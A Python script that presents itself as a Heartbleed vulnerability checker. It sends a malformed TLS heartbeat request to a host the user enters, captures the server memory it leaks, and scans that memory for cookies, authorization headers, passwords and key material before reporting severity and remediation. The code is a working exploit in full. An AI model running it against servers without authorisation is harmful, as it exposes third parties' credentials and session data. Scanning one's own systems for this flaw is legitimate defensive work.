import socket
import time
import ssl
import struct
import binascii
import re

# TLS Record Types
TLS_RECORD_HELLO = b'\x16'  # Handshake
TLS_RECORD_HEARTBEAT = b'\x18'  # Heartbeat

# TLS Version
TLS_VERSION_1_0 = b'\x03\x01'
TLS_VERSION_1_1 = b'\x03\x02'
TLS_VERSION_1_2 = b'\x03\x03'

# Handshake Message Types
HANDSHAKE_CLIENT_HELLO = b'\x01'

# TLS Extensions
TLS_EXTENSION_HEARTBEAT = b'\x00\x0f'  # Extension 15 for Heartbeat

# Cipher Suites (a few common ones)
TLS_CIPHER_SUITES = b'\x00\x2f\x00\x35\x00\x3c\x00\x3d\x00\x41\xc0\x11\xc0\x13\xc0\x14'

def create_client_hello():
    """
    Creates a TLS Client Hello message with Heartbeat extension.
    This is used to establish a TLS connection and announce heartbeat support.
    """
    # Random value (4-byte timestamp + 28 random bytes)
    gmt_unix_time = struct.pack('>I', int(time.time()))
    random_bytes = b'\x36\x24\x34\x16\x27\x09\x22\x07\xd7\xbe\xef\x69\xa1\xb2\x35\xc8\xb3\x88\xc4\x5c\xc9\x83\x47\x2b\x2b\xf8\x7f\x35'
    random = gmt_unix_time + random_bytes
    
    # Session ID (empty)
    session_id_length = b'\x00'
    session_id = b''
    
    # Cipher Suites
    cipher_suites_length = struct.pack('>H', len(TLS_CIPHER_SUITES))
    
    # Compression Methods
    compression_methods_length = b'\x01'  # 1 byte
    compression_methods = b'\x00'  # null compression
    
    # Extensions
    # Heartbeat extension
    heartbeat_extension = TLS_EXTENSION_HEARTBEAT + b'\x00\x01\x01'  # Extension type, length=1, peer_allowed_to_send=1
    
    # Other common extensions for a more realistic Client Hello
    server_name_extension = b'\x00\x00\x00\x00'  # Minimal SNI extension
    signature_algorithms = b'\x00\x0d\x00\x08\x00\x06\x04\x03\x04\x01\x05\x03\x05\x01'  # Common signature algorithms
    supported_groups = b'\x00\x0a\x00\x08\x00\x06\x00\x17\x00\x18\x00\x19'  # Common groups (x25519, secp256r1, secp384r1)
    
    # Combine all extensions
    extensions = heartbeat_extension + server_name_extension + signature_algorithms + supported_groups
    extensions_length = struct.pack('>H', len(extensions))
    
    # Handshake message
    handshake_msg = (
        HANDSHAKE_CLIENT_HELLO +  # Client Hello message type
        b'\x00\x00\x00' +  # Length placeholder (will be filled in later)
        TLS_VERSION_1_2 +  # Protocol version
        random +  # Random
        session_id_length + session_id +  # Session ID
        cipher_suites_length + TLS_CIPHER_SUITES +  # Cipher Suites
        compression_methods_length + compression_methods +  # Compression Methods
        extensions_length + extensions  # Extensions
    )
    
    # Update handshake message length
    msg_length = struct.pack('>I', len(handshake_msg) - 4)[1:]  # 3 bytes
    handshake_msg = handshake_msg[:1] + msg_length + handshake_msg[4:]
    
    # TLS Record Layer
    record_layer = (
        TLS_RECORD_HELLO +  # Record type: Handshake
        TLS_VERSION_1_2 +  # Protocol version
        struct.pack('>H', len(handshake_msg)) +  # Length
        handshake_msg  # Payload
    )
    
    return record_layer

def create_heartbeat_request(payload_length=0x4000):
    """
    Creates a malformed heartbeat request with a large payload_length but small actual payload.
    This is the core of the Heartbleed exploit.
    """
    # Heartbeat message type: Request
    heartbeat_type = b'\x01'
    
    # Payload length (set to maximum allowed to try to read more data)
    # This is the vulnerable part - we claim a large payload but send a small one
    payload_length_bytes = struct.pack('>H', payload_length)
    
    # Actual payload (small)
    actual_payload = b'BLEED'
    
    # Padding (at least 16 bytes according to RFC)
    padding = b'\x00' * 16
    
    # Heartbeat message
    heartbeat_msg = heartbeat_type + payload_length_bytes + actual_payload + padding
    
    # TLS Record Layer
    record_layer = (
        TLS_RECORD_HEARTBEAT +  # Record type: Heartbeat
        TLS_VERSION_1_2 +  # Protocol version
        struct.pack('>H', len(heartbeat_msg)) +  # Length
        heartbeat_msg  # Payload
    )
    
    return record_layer

def analyze_response(data, original_request_size):
    """
    Analyzes the server's response to detect Heartbleed vulnerability.
    """
    # If response is too large, it might contain memory content
    if len(data) > original_request_size + 16:  # Accounting for some overhead
        # Look for patterns that might indicate leaked memory
        # Check for printable strings
        printable_data = re.sub(rb'[^\x20-\x7E]', b'.', data)
        printable_str = printable_data.decode('ascii', errors='replace')
        
        # Check for specific patterns in leaked data
        patterns = [
            (rb'Cookie:', "Possible cookie data leaked"),
            (rb'Authorization:', "Possible authorization header leaked"),
            (rb'password', "Possible password leaked"),
            (rb'<.*>', "Possible HTML/XML content leaked"),
            (rb'\{.*\}', "Possible JSON content leaked"),
            (rb'SELECT|INSERT|UPDATE|DELETE', "Possible SQL query leaked"),
            (rb'key|pem|certificate', "Possible cryptographic material leaked")
        ]
        
        # Check for pattern matches
        found_patterns = []
        for pattern, description in patterns:
            if re.search(pattern, data, re.IGNORECASE):
                found_patterns.append(description)
        
        return True, len(data) - original_request_size, found_patterns, printable_str[:200]  # Limit string size
    
    return False, 0, [], ""

def is_ssl_available(host, port):
    """
    Checks if SSL/TLS is available on the specified host and port.
    """
    try:
        context = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssl_sock:
                return True
    except Exception:
        return False

def get_openssl_version_info(host, port):
    """
    Attempts to identify OpenSSL version information from the server response.
    """
    try:
        # Try to connect and check server response for version info
        context = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssl_sock:
                # Get peer certificate
                cert = ssl_sock.getpeercert(binary_form=True)
                if cert:
                    # Try to extract server information
                    server_info = ssl_sock.cipher()
                    # Check cipher info for OpenSSL indicators
                    if server_info:
                        return f"Server using {server_info[1]} with cipher {server_info[0]}"
    except Exception:
        pass
    
    return "Unable to determine OpenSSL version"

def check_heartbleed(host, port=443):
    """
    Enhanced testing for Heartbleed vulnerability (CVE-2014-0160).
    Uses proper TLS handshake and analyzes response patterns more thoroughly.
    """
    results = []
    vulnerable = False
    leak_size = 0
    leaked_data_description = []
    
    try:
        # First check if SSL/TLS is available on the port
        if not is_ssl_available(host, port):
            results.append({
                "issue": f"SSL/TLS not available on {host}:{port}, skipping Heartbleed test",
                "severity": "Low"
            })
            return results
        
        # Get OpenSSL information if possible
        openssl_info = get_openssl_version_info(host, port)
        
        # Perform the actual Heartbleed test
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sys_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            # Connect to the server
            sock.connect((host, port))
            
            # Send Client Hello with Heartbeat extension
            client_hello = create_client_hello()
            sock.send(client_hello)
            
            # Receive Server Hello and other handshake messages
            # We don't need to fully parse these for the Heartbleed test
            time.sleep(0.5)  # Give server time to respond
            sock.recv(8192)  # Receive and discard handshake messages
            
            # Send the malformed Heartbeat request
            heartbeat_req = create_heartbeat_request()
            sock.send(heartbeat_req)
            
            # Record original request size
            original_request_size = len(heartbeat_req)
            
            # Receive response
            time.sleep(1)  # Give server time to respond
            response = b''
            
            # Try to receive data with a timeout
            sock.settimeout(5)
            try:
                while True:
                    chunk = sock.recv(16384)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                # Timeout is expected when we've received all data
                pass
            
            # Analyze response
            vulnerable, leak_size, leaked_data_description, printable_data = analyze_response(response, original_request_size)
            
            if vulnerable:
                description = f"Vulnerable to Heartbleed! Memory leak detected ({leak_size} bytes)."
                if leaked_data_description:
                    description += f" Potentially contains: {', '.join(leaked_data_description)}."
                
                results.append({
                    "issue": description,
                    "severity": "Critical"
                })
                
                # Add recommendations
                results.append({
                    "issue": "URGENT: Update OpenSSL to version 1.0.1g or later. Revoke and reissue all SSL certificates.",
                    "severity": "Critical"
                })
            else:
                results.append({
                    "issue": f"Not vulnerable to Heartbleed. {openssl_info}",
                    "severity": "Low"
                })
        finally:
            sock.close()
            
    except socket.error as e:
        results.append({
            "issue": f"Could not test for Heartbleed vulnerability: {str(e)}",
            "severity": "Low"
        })
    except Exception as e:
        results.append({
            "issue": f"Error during Heartbleed test: {str(e)}",
            "severity": "Low"
        })
    
    return results

# Test function to validate the check_heartbleed function
def test_heartbleed_check():
    """
    Simple test function for the Heartbleed checker.
    """
    # Test with a known vulnerable server (simulation)
    print("Testing Heartbleed scanner...")
    
    # Enter a hostname to test
    hostname = input("Enter hostname to test for Heartbleed: ")
    results = check_heartbleed(hostname)
    
    for result in results:
        print(f"{result['severity']}: {result['issue']}")
    
    return results

if __name__ == "__main__":
    test_heartbleed_check()